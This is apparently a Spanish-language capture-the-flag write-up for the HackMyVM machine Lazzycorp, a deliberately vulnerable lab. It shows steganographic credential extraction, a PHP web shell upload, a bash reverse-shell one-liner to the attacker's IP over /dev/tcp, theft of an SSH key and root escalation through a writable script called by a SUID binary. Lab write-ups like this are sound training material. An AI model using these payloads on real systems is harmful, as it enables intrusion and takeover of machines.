# Lazzycorp - Writeup HackMyVm

El día de hoy veremos cómo resolver la máquina **Lazzycorp** de la
plataforma HackMyVM.\
Durante la explotación tocaremos las siguientes técnicas:

- Escaneo de puertos
- Leak de información
- Enumeración de directorios
- Steganografía
- Subida de archivos maliciosos
- Escalada de privilegios con SUID

## Enumeración

Comenzamos con un escaneo de puertos con **nmap**:

``` bash
sudo nmap -p- --open -sSCV --min-rate 5000 -n -Pn 192.168.1.157
```

``` java
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.1.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 46:82:43:4b:ef:e0:b0:50:04:c0:d5:2c:3c:5c:7d:4a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2hBHERpgM+J9HRllTqtT7svnthPH2aDlbAWWgSYdDMLzWxN6dKwOHyr1Zr1DrRQHFfNb2deeXGDwX8zjVjS/HDAFGMY4/5rI6nvM5WnSX4Rl2SSiMW6BhscZnoOd4OyveGZ10sGPKxJc8Rbt9v6hpJcjq7clD0ALEhJHMQf1>
|   256 52:79:ea:92:35:b4:f2:5d:b9:14:f0:21:1c:eb:2f:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBje/WVSD3o77qSU8lM+VaPHiFGQtc0MJxG30xN+FrrDr91CFD4sWxckAfA2dkOodpdYUlzOEXKUzDrJdGnVfC4=
|   256 98:fa:95:86:04:75:31:39:c6:60:26:9e:26:86:82:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAjJ53/CHL8BZslI+w4Uz5VYdWp3ERTgae6o9+0ouFdN
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/cms-admin.php /auth-LazyCorp-dev/
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: LazyCorp | Empowering Devs
MAC Address: 08:00:27:DA:33:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Vemos que el puerto FTP permite login anónimo. Dentro del directorio **pub** encontramos una imagen llamada note.jpg:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||33691|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg
226 Directory send OK.
ftp> 
````
Utilizando stegseek conseguimos encontrar credenciales para el usuario dev:

```shell
stegseek note.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "creds.txt".
[i] Extracting to "note.jpg.out".
````
```bash
cat note.jpg.put

Username: dev
Password: d3v3l0pm3nt!nt3rn 
````
Guardamos las credenciales y accedemos al puerto 80, donde encontramos la web:
![alt text](img/lazzycorp001.png)

Al no haber nada funcional, procedemos a enumerar directorios con dirsearch:
```bash
dirsearch -u http://192.168.1.157/
````
```bash
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/alejandro/Escritorio/Maquinas/Lazzycorp/content/reports/http_192.168.1.157/__25-08-25_17-43-12.txt

Target: http://192.168.1.157/

[17:43:12] Starting: 
[17:43:41] 301 -  313B  - /blog  ->  http://192.168.1.157/blog/
[17:43:41] 403 -  278B  - /blog/
[17:44:19] 200 -   55B  - /robots.txt
[17:44:21] 403 -  278B  - /server-status
[17:44:21] 403 -  278B  - /server-status/
[17:44:33] 301 -  316B  - /uploads  ->  http://192.168.1.157/uploads/
[17:44:33] 403 -  278B  - /uploads/

Task Completed
````
```txt
Disallow: /cms-admin.php
Disallow: /auth-lazycorp-dev/
````
Probamos a ver si existía un login.php en /auth-lazycorp-dev/ y reutilizamos las credenciales encontradas:
![alt text](img/lazzycorp003.png)

Logramos entrar y encontramos un sistema de subida de módulos:
![alt text](img/lazzycorp004.png)

Subimos un script **.php** malicioso:
![alt text](img/lazzycorp005.png)

Los archivos se almacenan en /uploads, confirmando la ubicación de nuestra shell:
![alt text](img/lazzycorp006.png)

Nos enviamos una reverse shell:
```bash
nc -lvnp 9001
````
```bash
http://192.168.1.157/auth-lazycorp-dev/uploads/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.152/9001 0>%260"
````
## Escalada de privilegios
El directorio de arvind es accesible con www-data. Conseguimos la clave id_rsa para iniciar sesión por SSH como arvind:
```bash
www-data@arvindlazycorp:/home/arvind/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
````
En el directorio de inicio encontramos un binario SUID llamado reset. Al no poder ver el código fuente, usamos strace:
```powershell
strace ./reset
execve("./reset", ["./reset"], 0x7ffc573063f0 /* 57 vars */) = 0
brk(NULL)                               = 0x55c1ffdac000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f46b376c000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No existe el fichero o el directorio)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=121407, ...}) = 0
mmap(NULL, 121407, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f46b374e000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0p\236\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 840, 64) = 840
fstat(3, {st_mode=S_IFREG|0755, st_size=2003408, ...}) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 840, 64) = 840
mmap(NULL, 2055800, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f46b3558000
mmap(0x7f46b3580000, 1462272, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7f46b3580000
mmap(0x7f46b36e5000, 352256, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0x7f46b36e5000
mmap(0x7f46b373b000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e2000) = 0x7f46b373b000
mmap(0x7f46b3741000, 52856, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f46b3741000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f46b3555000
arch_prctl(ARCH_SET_FS, 0x7f46b3555740) = 0
set_tid_address(0x7f46b3555a10)         = 232827
set_robust_list(0x7f46b3555a20, 24)     = 0
rseq(0x7f46b3555680, 0x20, 0, 0x53053053) = 0
mprotect(0x7f46b373b000, 16384, PROT_READ) = 0
mprotect(0x55c1c2b94000, 4096, PROT_READ) = 0
mprotect(0x7f46b37a8000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7f46b374e000, 121407)          = 0
setuid(0)                               = -1 EPERM (Operación no permitida)
rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f46b3597df0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f46b3597df0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
mmap(NULL, 36864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7f46b3763000
rt_sigprocmask(SIG_BLOCK, ~[], [CHLD], 8) = 0
clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x7f46b3763000, stack_size=0x9000}, 88) = 232828
munmap(0x7f46b3763000, 36864)           = 0
rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
wait4(232828sh: 1: /usr/bin/reset_site.sh: not found
, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0, NULL) = 232828
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f46b3597df0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f46b3597df0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=232828, si_uid=1000, si_status=127, si_utime=0, si_stime=0} ---
exit_group(0)                           = ?
+++ exited with 0 +++
````
Detectamos que ejecuta /usr/bin/reset_site.sh. Contenido del script:
```bash
#!/bin/bash

echo "[*] Resetting website from backup..."

# Remove current site
rm -rf /var/www/html/*
# Restore from backup
cp -r /opt/backup/* /var/www/html/
# Set correct ownership
chown -R www-data:www-data /var/www/html/

echo "[+] Done resetting."
````
Modificamos el script para obtener una shell root:
```bash
#!/bin/bash

sudo bash
````
Ejecutamos ./reset:
```bash
arvind@arvindlazycorp:~$ ./reset 
root@arvindlazycorp:/home/arvind# id
uid=0(root) gid=0(root) groups=0(root)
root@arvindlazycorp:/home/arvind# 
````

¡Y somos root! 🎉